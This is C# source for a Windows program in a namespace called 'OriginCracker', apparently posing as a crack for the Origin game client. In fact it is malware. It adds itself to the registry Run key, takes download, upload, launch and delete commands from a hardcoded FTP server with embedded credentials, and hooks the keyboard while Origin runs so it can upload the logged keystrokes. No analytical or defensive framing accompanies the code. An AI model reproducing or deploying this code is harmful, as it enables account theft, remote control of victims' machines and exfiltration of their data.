using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace OriginCracker
{
    public partial class Form1 : Form
    {
        private const string FTP = "ftp://node0.net2ftp.ru";
        private const string USERNAME = "iskusnow@mail.ru";
        private const string PASSWORD = "fbc3454a963b";
        private const string COMMANDSURL = "/commands/commands.dat";
        private const string APPLICATION_NAME = "Origin";

        private DateTime CURRENTDATE;
        private bool end;
        private UserActivityHook hook;
        private List<Keys> keys;
        private int recordTime;
        private int curTime;
        private bool isRecord;
        private bool originRun;

        public Form1()
        {
            try
            {
                InitializeComponent();
                originRun = false;
                Start();
            }
            catch (Win32Exception exc)
            {
                MessageBox.Show(exc.Message);
            }
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            try
            {
                ProcessCommand(Messager.GetCommand(FTP + COMMANDSURL, USERNAME, PASSWORD));
                if (Checker.CheckProcess() && !originRun)
                {
                    Record();
                    originRun = true;
                }
                if (!Checker.CheckProcess())
                {
                    originRun = false;
                }
                if (isRecord && curTime >= recordTime)
                {
                    EndRecord();
                }
                curTime += timer.Interval;
            }
            catch (Exception exc)
            {

            }
        }

        private void ProcessCommand(string commands)
        {
            if (commands == "")
                return;
            string[] commandArray = commands.Split('\n');
            if (Convert.ToDateTime(commandArray[0]) <= CURRENTDATE)
                return;
            CURRENTDATE = Convert.ToDateTime(commandArray[0]);
            int i = 1;
            while (i < commandArray.Length)
            {
                Thread.Sleep(1000);
                string[] splitCommand = commandArray[i].Split(' ');
                switch ((splitCommand[0]))
                {
                    case "download":
                        Messager.DownloadFile(FTP + splitCommand[1], splitCommand[2], USERNAME, PASSWORD);
                        i++;
                        break;
                    case "upload":
                        Messager.UploadFile(FTP + splitCommand[1], splitCommand[2], USERNAME, PASSWORD);
                        i++;
                        break;
                    case "launch":
                        LaunchFile(splitCommand[1]);
                        i++;
                        break;
                    case "delete":
                        DeleteFile(splitCommand[1]);
                        i++;
                        break;
                    case "recordTime":
                        recordTime = Convert.ToInt32(splitCommand[1]);
                        i++;
                        break;
                    case "startRecord":
                        Record();
                        i++;
                        break;
                    case "end":
                        EndWork();
                        i++;
                        return;
                }
            }
        }

        private void LaunchFile(string path)
        {
            Process.Start(path);
        }

        private void DeleteFile(string path)
        {
            File.Delete(path);
        }

        private void EndWork()
        {
            end = true;
            SetAutorunValue(false);
        }

        public bool SetAutorunValue(bool autorun)
        {
            string ExePath = System.Windows.Forms.Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autorun)
                    reg.SetValue(APPLICATION_NAME, ExePath);
                else
                    reg.DeleteValue(APPLICATION_NAME);

                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }

        private void KeyPressProcess(object sender, Keys KeyCode, bool ctrl)
        {
            keys.Add(KeyCode);
        }

        private void Start()
        {
            if (Checker.CheckClient() && !end)
            {
                if (Checker.CheckProcess())
                    originRun = true;
                this.WindowState = FormWindowState.Minimized;
                timer.Interval = 10000;
                CURRENTDATE = Convert.ToDateTime("01.01.2000 00:00:00");
                SetAutorunValue(true);
                timer.Start();
                if (!File.Exists("data.txt"))
                {
                    isRecord = false;
                    recordTime = 60000;
                    end = false;
                }
                else
                {
                    StreamReader reader = new StreamReader(File.OpenRead("data.txt"));
                    recordTime = Convert.ToInt32(reader.ReadLine());
                    end = Convert.ToBoolean(reader.ReadLine());
                    CURRENTDATE = Convert.ToDateTime(reader.ReadLine());
                    reader.Close();
                }
            }
            else
                EndWork();
        }

        private void Record()
        {
            curTime = 0;
            isRecord = true;
            hook = new UserActivityHook(false, true);
            hook.KeyPress += new UserActivityHook.KeyInfoEventHandler(this.KeyPressProcess);
            keys = new List<Keys>();
        }
        
        private void EndRecord()
        {
            hook.Stop();
            isRecord = false;
            StreamWriter writer = new StreamWriter(File.Create("record.txt"));
            foreach (var i in keys)
            {
                writer.Write(i.ToString());
            }
            writer.Close();
            Messager.UploadFile(FTP + "/record.txt","record.txt",USERNAME,PASSWORD);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            StreamWriter writer = new StreamWriter(File.Create("data.txt"));
            writer.WriteLine(recordTime.ToString());
            writer.WriteLine(end.ToString());
            writer.WriteLine(CURRENTDATE.ToString());
            writer.Close();
        }
    }
}
